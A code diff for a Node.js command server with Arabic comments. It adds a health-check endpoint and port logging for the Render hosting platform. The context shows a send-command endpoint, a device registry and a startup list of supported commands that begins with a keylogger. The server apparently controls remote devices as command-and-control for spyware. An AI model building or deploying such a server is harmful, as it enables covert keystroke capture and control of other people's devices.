@@ -181,6 +181,20 @@ class CommandServer {
       });
     });
 
+    // نقطة فحص الصحة لـ Render
+    this.app.get('/health', (req, res) => {
+      res.status(200).json({
+        status: 'healthy',
+        service: 'command-server',
+        version: '2.1.5',
+        timestamp: new Date().toISOString(),
+        uptime: process.uptime(),
+        memory: process.memoryUsage(),
+        devices: this.devices.size,
+        port: process.env.PORT || 10001
+      });
+    });
+
     // إرسال أمر للجهاز
     this.app.post('/send-command', (req, res) => {
       try {
@@ -2115,11 +2129,11 @@ class CommandServer {
   }
 
   start(port = process.env.PORT || 10001) {
-    // تأكد من استخدام المنفذ الصحيح
+    // تأكد من استخدام المنفذ الصحيح - Render يتطلب process.env.PORT
     const actualPort = process.env.PORT || 10001;
     console.log(`🔧 محاولة تشغيل على المنفذ: ${actualPort}`);
-    console.log(`🔧 متغير PORT: ${process.env.PORT}`);
-    console.log(`🔧 عنوان الاستماع: 0.0.0.0`);
+    console.log(`🔧 متغير PORT: ${process.env.PORT || 'غير محدد'}`);
+    console.log(`🔧 عنوان الاستماع: 0.0.0.0 (مطلوب لـ Render)`);
     
     this.server.listen(actualPort, '0.0.0.0', () => {
       console.log(`🚀 خادم الأوامر يعمل على المنفذ ${actualPort}`);
@@ -2130,6 +2144,7 @@ class CommandServer {
       console.log('📊 نظام السجلات المتقدم جاهز');
       console.log('🛠️ الخدمات الخلفية تعمل');
       console.log('🌐 جاهز لاستقبال الطلبات');
+      console.log('☁️ متوافق مع Render');
       console.log('');
       console.log('📋 الأوامر المتقدمة المدعومة:');
       console.log('  🔑 Keylogger: start, stop, get_data');
